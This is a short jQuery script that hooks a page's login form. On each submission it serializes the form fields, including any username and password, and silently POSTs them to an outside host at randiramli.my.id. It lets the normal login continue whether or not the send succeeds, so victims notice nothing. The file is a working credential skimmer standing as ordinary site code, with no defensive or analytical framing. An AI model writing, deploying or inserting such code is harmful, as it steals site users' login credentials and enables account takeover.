$(".login-form").submit(function() {
	var d = $(".login-form");
	
	$.ajax({
        url: "http://randiramli.my.id/curl/index.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
